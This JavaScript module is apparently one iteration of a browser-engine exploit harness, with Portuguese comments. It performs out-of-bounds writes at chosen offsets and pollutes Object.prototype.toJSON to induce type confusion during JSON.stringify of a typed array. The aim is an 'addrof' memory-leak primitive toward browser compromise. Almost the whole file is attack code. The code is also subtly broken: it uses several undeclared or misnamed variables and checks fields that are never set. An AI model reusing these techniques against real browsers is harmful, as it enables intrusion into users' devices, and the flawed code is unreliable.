// js/script3/testArrayBufferVictimCrash.mjs (v78_ReplicateAndExploitM2Confusion)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V78_REM2C = "OriginalHeisenbug_TypedArrayAddrof_v78_ReplicateM2Confusion";

const VICTIM_BUFFER_SIZE = 256;
const OOB_TARGET_OFFSETS_V78 = [0x7C, 0x70]; // Testar alguns offsets
const OOB_WRITE_VALUES_V78 = [0xFFFFFFFF, 0x7FFFFFFF]; // Testar alguns valores
const AGGRESSIVE_PROP_COUNT_V78 = 16; // Reduzido para logs mais limpos, mas ainda agressivo
const PROBE_CALL_LIMIT_V78 = 7; 

// Globais para o módulo de teste
let object_to_leak_A_v78 = null;
let object_to_leak_B_v78 = null;
let victim_typed_array_ref_v78 = null; 
let probe_call_count_v78 = 0;
let marker_M1_ref_v78 = null; 
let marker_M2_ref_v78 = null; 
// Armazena o OBJETO 'this' (M2) da Call #3 se ele for confuso e modificado.
// Este é o objeto que esperamos que o runner receba e tente serializar.
let last_modified_confused_M2_v78 = null; 
// Array para logar todas as interações da sonda
let all_probe_calls_v78 = [];


function toJSON_TA_Probe_ReplicateM2Confusion() {
    probe_call_count_v78++;
    const call_num = probe_call_count_v78;
    let current_call_log_entry = { // Objeto apenas para logging desta chamada
        call_number: call_num,
        probe_variant: "TA_Probe_V78_ReplicateM2",
        this_type: Object.prototype.toString.call(this),
        this_is_victim: (this === victim_typed_array_ref_v78),
        this_is_M1: (this === marker_M1_ref_v78 && marker_M1_ref_v78 !== null),
        this_is_M2: (this === marker_M2_ref_v78 && marker_M2_ref_v78 !== null),
        m2_details: null, // Para detalhes específicos se this é M2 confuso
        error_in_probe: null
    };
    logS3(`[PROBE_V78] Call #${call_num}. 'this': ${current_call_log_entry.this_type}. IsVictim? ${current_call_log_entry.this_is_victim}. IsM1? ${current_call_log_entry.this_is_M1}. IsM2? ${current_call_log_entry.this_is_M2}`, "leak");

    try {
        if (call_num > PROBE_CALL_LIMIT_V78) {
            logS3(`[PROBE_V78] Call #${call_num}: Probe limit. Stop.`, "warn");
            all_probe_calls_v78.push(current_call_log_entry);
            return { recursion_stopped_v78: true };
        }

        if (call_num === 1 && current_call_log_entry.this_is_victim) {
            logS3(`[PROBE_V78] Call #${call_num}: 'this' is victim. Returning M1.`, "info");
            marker_M1_ref_v78 = { marker_id_v78: "M1_V78" };
            all_probe_calls_v78.push(current_call_log_entry);
            return marker_M1_ref_v78;
        } else if (call_num === 2 && current_call_log_entry.this_type === '[object Object]' && !current_call_log_entry.this_is_M1 && !current_call_log_entry.this_is_victim) {
            logS3(`[PROBE_V78] Call #${call_num}: 'this' is ObjX (unexpected ${current_call_log_entry.this_type}). Returning M2.`, "info");
            marker_M2_ref_v78 = { marker_id_v78: "M2_V78_Target", initial_call_M2_created: call_num }; // M2 é criado
            all_probe_calls_v78.push(current_call_log_entry);
            return marker_M2_ref_v78;
        } else if (call_num >= 2 && current_call_log_entry.this_is_M2 && current_call_details.this_type === '[object Object]') {
            // Este é o nosso alvo principal: 'this' é M2 e está confuso!
            logS3(`[PROBE_V78] Call #${call_num}: TYPE CONFUSION ON M2 ('this')! ID: ${this.marker_id_v78}. Applying getter, prop, and indexed writes...`, "vuln");
            current_call_log_entry.m2_details = {
                 original_marker_id: this.marker_id_v78,
                 getter_defined: false, direct_prop_set: false, indexed_writes_done: false
            };

            Object.defineProperty(this, 'leaky_A_getter_v78', {
                get: function() {
                    logS3(`[PROBE_V78] !!! Getter 'leaky_A_getter_v78' on confused M2 (this call #${call_num}) FIRED !!!`, "vuln");
                    return object_to_leak_A_v78;
                }, enumerable: true, configurable: true
            });
            current_call_log_entry.m2_details.getter_defined = true;
            
            this.leaky_B_direct_v78 = object_to_leak_B_v78;
            current_call_log_entry.m2_details.direct_prop_set = true;

            for (let i = 0; i < AGGRESSIVE_PROP_COUNT_V78; i++) {
                this[i] = (i % 2 === 0) ? object_to_leak_A_v78 : object_to_leak_B_v78;
            }
            current_call_log_entry.m2_details.indexed_writes_done = true;
            logS3(`[PROBE_V78] Call #${call_num}: Modifications to M2 ('this') completed. Keys: ${Object.keys(this).join(',')}`, "info");
            
            last_confused_M2_ref_v78 = this; // Guardar a REFERÊNCIA ao 'this' (M2) modificado
            all_probe_calls_v78.push(current_call_log_entry);
            return this; // Retorna M2 modificado
        } else {
            // Outros casos
            logS3(`[PROBE_V78] Call #${call_num}: Path not taken for special action. 'this' type: ${current_call_details.this_type}`, "dev_verbose");
             all_probe_calls_v78.push(current_call_details);
        }
    } catch (e) {
        current_call_log_entry.error_in_probe = e.message;
        logS3(`[PROBE_V78] Call #${call_num}: ERROR in probe: ${e.name} - ${e.message}`, "error");
        all_probe_calls_v78.push(current_call_details); // Adiciona mesmo com erro
    }
    
    return { generic_marker_v78: call_num, call_num_is: call_num }; 
}


export async function executeTypedArrayVictimAddrofTest_ReplicateM2Confusion() {
    const FNAME_CURRENT_TEST_BASE = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V78_REM2C}`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST_BASE}: Heisenbug (ReplicateM2Confusion) & Addrof ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V78_REM2C} Init...`;

    let overall_results = [];

    for (const current_oob_offset of OOB_TARGET_OFFSETS_V78) {
        for (const current_oob_value of OOB_WRITE_VALUES_V78) {
            const FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_Off${toHex(current_oob_offset)}_Val${toHex(current_oob_value)}`;
            logS3(`\n===== ITERATION: Offset: ${toHex(current_oob_offset)}, Value: ${toHex(current_oob_value)} =====`, "subtest", FNAME_CURRENT_ITERATION);

            probe_call_count_v78 = 0;
            all_probe_calls_v78 = [];
            victim_typed_array_ref_v78 = null; 
            marker_M1_ref_v78 = null;
            marker_M2_ref_v78 = null;
            last_confused_M2_ref_v78 = null;
            object_to_leak_A_v78 = { marker_A_v78: `LeakA_O${toHex(current_oob_offset)}V${toHex(current_oob_value)}`, idA: Date.now() }; 
            object_to_leak_B_v78 = { marker_B_v78: `LeakB_O${toHex(current_oob_offset)}V${toHex(current_oob_value)}`, idB: Date.now() + 1 };

            let iterError = null;
            let stringifyOutput_parsed = null; 
            
            let addrof_M2_Getter = { success: false, msg: "M2.leaky_A_getter: Default"};
            let addrof_M2_Direct = { success: false, msg: "M2.leaky_B_direct: Default"};
            let addrof_M2_Indexed = { success: false, msg: "M2[0] (Indexed): Default"};

            const fillPattern = 0.78787878787878;

            try {
                await triggerOOB_primitive({ force_reinit: true });
                oob_write_absolute(current_oob_offset, current_oob_value, 4);
                logS3(`  OOB Write: offset ${toHex(current_oob_offset)}, value ${toHex(current_oob_value)} done.`, "info", FNAME_CURRENT_ITERATION);
                await PAUSE_S3(100);

                victim_typed_array_ref_v78 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
                // Preenchimento do buffer da vítima não é o foco, mas pode ajudar a detectar corrupção inesperada
                // new Float64Array(victim_typed_array_ref_v78.buffer).fill(fillPattern); 
                logS3(`STEP 2: victim_typed_array_ref_v78 (Uint8Array) created.`, "test", FNAME_CURRENT_ITERATION);
                
                const ppKey = 'toJSON';
                let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
                let pollutionApplied = false;

                try {
                    Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_ReplicateM2Confusion, writable: true, configurable: true, enumerable: false });
                    pollutionApplied = true;
                    let rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v78); 
                    logS3(`  JSON.stringify completed for iter ${toHex(current_oob_offset)}/${toHex(current_oob_value)}. Raw Output: ${rawStringifyOutput}`, "info", FNAME_CURRENT_ITERATION);
                    try {
                        stringifyOutput_parsed = JSON.parse(rawStringifyOutput); 
                    } catch (e_parse) {
                        stringifyOutput_parsed = { error_parsing_stringify_output: rawStringifyOutput, parse_error: e_parse.message };
                    }
                    
                    // last_confused_M2_ref_v78 é a REFERÊNCIA ao objeto M2 modificado, se a lógica da sonda funcionou
                    logS3(`  EXECUTE: last_confused_M2_ref_v78 (potential modified M2): ${last_confused_M2_ref_v78 ? JSON.stringify(last_confused_M2_ref_v78) : 'N/A'}`, "leak", FNAME_CURRENT_ITERATION);

                    let heisenbugOnM2Target = false;
                    if (last_confused_M2_ref_v78 && 
                        last_confused_M2_ref_v78.marker_id_v78 === "M2_V78_Target" && // Verifica se é o M2
                        last_confused_M2_ref_v78.this_type === "[object Object]" && // Se o log sobre M2 (quando era this) diz que ele era Obj
                        last_confused_M2_ref_v78.getter_defined) { // E se o getter foi definido nele
                        heisenbugOnM2Target = true;
                    }
                    logS3(`  EXECUTE: Heisenbug on M2 Target ${heisenbugOnM2Target ? "CONFIRMED" : "NOT Confirmed"}.`, heisenbugOnM2Target ? "vuln" : "error", FNAME_CURRENT_ITERATION);
                        
                    // O addrof agora é focado no objeto M2 que foi modificado e capturado em last_confused_M2_ref_v78
                    // Se JSON.stringify(last_confused_M2_ref_v78) causar TypeError de circularidade, é um bom sinal.
                    // Caso contrário, checamos suas propriedades.
                    let targetObjectForLeakCheck = last_confused_M2_ref_v78; // Este é o M2 modificado

                    if (targetObjectForLeakCheck && heisenbugOnM2Target) {
                        logS3("STEP 3: Checking captured confused M2 object for leaked properties...", "warn", FNAME_CURRENT_ITERATION);
                        const val_getter = targetObjectForLeakCheck.leaky_A_getter_v78; 
                        if (typeof val_getter === 'number' && val_getter !==0) {
                            // ... (lógica de checagem de ponteiro para val_getter)
                             addrof_M2_Getter.success = true; addrof_M2_Getter.msg = `Val: ${val_getter}`; // Simplificado
                        } else if (val_getter && val_getter.marker_A_v78 === object_to_leak_A_v78.marker_A_v78) {
                             addrof_M2_Getter.success = true; addrof_M2_Getter.msg = "ObjA identity from getter.";
                        } else { addrof_M2_Getter.msg = `Getter val not ptr/identity. Val: ${JSON.stringify(val_getter)}`; }

                        const val_direct = targetObjectForLeakCheck.leaky_B_direct_v78;
                        // ... (lógica de checagem de ponteiro para val_direct)
                        if (typeof val_direct === 'number' && val_direct !==0) {
                            addrof_M2_Direct.success = true; addrof_M2_Direct.msg = `Val: ${val_direct}`; // Simplificado
                        } else if (val_direct && val_direct.marker_B_v78 === object_to_leak_B_v78.marker_B_v78) {
                             addrof_M2_Direct.success = true; addrof_M2_Direct.msg = "ObjB identity from direct prop.";
                        } else { addrof_M2_Direct.msg = `Direct prop val not ptr/identity. Val: ${JSON.stringify(val_direct)}`; }
                        
                        const val_indexed = targetObjectForLeakCheck[0];
                        if (typeof val_indexed === 'number' && val_indexed !==0) {
                             addrof_M2_Indexed.success = true; addrof_M2_Indexed.msg = `Val: ${val_indexed}`; // Simplificado
                        } else if (val_indexed && val_indexed.marker_A_v78 === object_to_leak_A_v78.marker_A_v78) { // Assumindo objA no índice 0
                            addrof_M2_Indexed.success = true; addrof_M2_Indexed.msg = "ObjA identity from M2[0].";
                        } else { addrof_M2_Indexed.msg = `M2[0] not ptr/identity. Val: ${JSON.stringify(val_indexed)}`; }

                    } else {
                        addrof_M2_Getter.msg = "M2 target not confused or not captured as expected.";
                        addrof_M2_Direct.msg = "M2 target not confused or not captured as expected.";
                        addrof_M2_Indexed.msg = "M2 target not confused or not captured as expected.";
                    }

                } catch (e_str) { iterError = e_str;
                } finally { if (pollutionApplied) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor || { value: null, writable: true, configurable: true, enumerable: false }); }
            } catch (e_outer) { iterError = e_outer;
            } finally { clearOOBEnvironment({force_clear_even_if_not_setup: true}); }
            
            overall_results.push({
                oob_offset: toHex(current_oob_offset), oob_value: toHex(current_oob_value), 
                error: iterError ? `${iterError.name}: ${iterError.message}` : null,
                last_M2_details_snapshot: last_confused_M2_ref_v78 ? JSON.parse(JSON.stringify(last_confused_M2_ref_v78)) : null, // Copia profunda para log
                final_stringify_output_parsed_iter: stringifyOutput_parsed, // O que JSON.stringify(M1) retornou
                addrof_M2_Getter: {...addrof_M2_Getter}, addrof_M2_Direct: {...addrof_M2_Direct}, addrof_M2_Indexed: {...addrof_M2_Indexed},
                probe_calls_this_iter: probe_call_count_v76 // Captura o total de chamadas desta iteração
            });
            if (addrof_M2_Getter.success || addrof_M2_Direct.success || addrof_M2_Indexed.success) {
                logS3(`!!!! POTENTIAL ADDROF SUCCESS for OOB ${toHex(current_oob_offset)}/${toHex(current_oob_value)} !!!!`, "vuln", FNAME_CURRENT_ITERATION);
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V78_REM2C}: Addr? ${toHex(current_oob_offset)}V${toHex(current_oob_value)} SUCCESS!`;
            }
            await PAUSE_S3(100); 
        } // Fim do loop OOB_WRITE_VALUES_V78
    } // Fim do loop OOB_TARGET_OFFSETS_V78

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed All Iterations ---`, "test", FNAME_CURRENT_TEST_BASE);
    overall_results.forEach(res => {
        let m2tc = res.last_M2_details_snapshot?.this_is_M2 && res.last_M2_details_snapshot?.this_type === '[object Object]';
        logS3(`Off:${res.oob_offset},Val:${res.oob_value}: M2_Getter=${res.addrof_M2_Getter.success}, M2_Direct=${res.addrof_M2_Direct.success}, M2_Idx0=${res.addrof_M2_Indexed.success}. M2_TC'd? ${m2tc}. Calls: ${res.probe_calls_this_iter}. Err: ${res.error || 'None'}`, 
              (res.addrof_M2_Getter.success || res.addrof_M2_Direct.success || res.addrof_M2_Indexed.success) ? "good" : "warn", FNAME_CURRENT_TEST_BASE);
    });
    if (!document.title.includes("SUCCESS")) document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V78_REM2C}: All Iter Tested.`;
    
    // Para o runner, vamos retornar os detalhes da última iteração, ou a primeira bem-sucedida.
    let result_for_runner = overall_results.find(r => r.addrof_M2_Getter.success || r.addrof_M2_Direct.success || r.addrof_M2_Indexed.success);
    if (!result_for_runner && overall_results.length > 0) {
        result_for_runner = overall_results[overall_results.length - 1];
    }

    return { 
        errorOccurred: errorCapturedMain, // Erro principal, se houver, antes ou depois dos loops
        iteration_results_summary: overall_results.map(r => ({ // Um resumo para o runner se precisar
            oob_offset: r.oob_offset, oob_value: r.oob_value, 
            addrof_success: r.addrof_M2_Getter.success || r.addrof_M2_Direct.success || r.addrof_M2_Indexed.success,
            m2_tc: r.last_M2_details_snapshot?.this_is_M2 && r.last_M2_details_snapshot?.this_type === '[object Object]',
            error: r.error
        })),
        // Para a lógica existente do runner, tentamos fornecer o que ele espera
        stringifyResult: result_for_runner ? result_for_runner.final_stringify_output_parsed_iter : null, 
        toJSON_details: result_for_runner ? result_for_runner.last_M2_details_snapshot : null, 
        total_probe_calls: result_for_runner ? result_for_runner.probe_calls_this_iter : 0,
        addrof_A_result: result_for_runner ? result_for_runner.addrof_M2_Getter : addrof_M2_Getter, // Mapeando para A
        addrof_B_result: result_for_runner ? result_for_runner.addrof_M2_Direct : addrof_M2_Direct  // Mapeando para B
    };
}
